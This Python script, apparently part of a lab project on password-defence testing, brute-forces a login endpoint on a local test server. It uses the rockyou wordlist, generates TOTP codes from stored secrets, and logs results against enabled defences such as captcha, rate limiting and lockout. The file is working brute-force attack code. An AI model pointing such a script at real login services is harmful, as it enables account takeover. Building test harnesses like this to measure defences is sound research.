"""
Script for brute force attack
"""
import requests
import time
import json
import os
import sys
import pyotp
from app.config import GROUP_SEED, DEFENSE_METHODS
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BASE_URL = "http://127.0.0.1:5000"
USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")
WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")

def load_wordlist(limit=50000):
    with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
        return [line.strip() for line in f if line.strip()][:limit]

def load_users():
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def brute_force(username):
    users = load_users()
    target = next((u for u in users if u["username"] == username), None)
    if not target:
        print(f"[ERROR] User {username} not found in users.json")
        return

    hash_mode = target.get("hash_mode", "sha256")
    PASSWORD_LIST = load_wordlist()
    totp_failures = 0

    for candidate in PASSWORD_LIST:
        start = time.time()
        if target.get("totp_secret"):
        # for strong users use /login_totp and include a TOTP code
            code = pyotp.TOTP(target["totp_secret"]).now()
            resp = requests.post(f"{BASE_URL}/login_totp", json={
                "username": username,
                "password": candidate,
                "totp": code
            })
        else:
            # for weak/medium users we do a normal login
            resp = requests.post(f"{BASE_URL}/login", json={
                "username": username,
                "password": candidate
            })
        latency_ms = int((time.time() - start) * 1000)

        if resp.status_code == 403 and "captcha_required" in resp.text:
            print(f"[CAPTCHA] {username} blocked, stopping brute force.")
            return

        if resp.status_code == 429:
            print("[RATE LIMIT] Global block triggered, stopping brute force.")
            return
        
        if resp.status_code == 403 and "Account locked" in resp.text:
            print(f"[LOCKOUT] {username} locked, stopping attempts for this user.")
            return
        
        
        if resp.status_code == 401 and "Invalid TOTP" in resp.text:
            print(f"[TOTP] {username} rejected due to invalid TOTP, stopping attempts.")
            return
        
        if target.get("totp_secret") and resp.status_code == 401: 
            totp_failures += 1 
            if totp_failures >= 10: 
                print(f"[TOTP] {username} blocked after {totp_failures} invalid TOTP attempts.") 
                return


        if resp.status_code == 200:
            result = "SUCCESS"
            print(f"[SUCCESS] {username} cracked with '{candidate}' (latency {latency_ms} ms)")
            entry = {
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "hash_mode": hash_mode,
                "result": result,
                "latency_ms": latency_ms
            }
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            return  
        else:
            result = "FAILED"
            print(f"[FAILED] {username} with '{candidate}' (latency {latency_ms} ms)")

        entry = {
            "timestamp": datetime.now().isoformat(),
            "group_seed": GROUP_SEED,
            "username": username,
            "hash_mode": hash_mode,
            "protection_flags": [k for k,v in DEFENSE_METHODS.items() if v],
            "result": result,
            "latency_ms": latency_ms
        }

        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")

    print(f"[INFO] Exhausted list, no success for {username}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python scripts/brute_force.py <username>")
    else:
        brute_force(sys.argv[1])
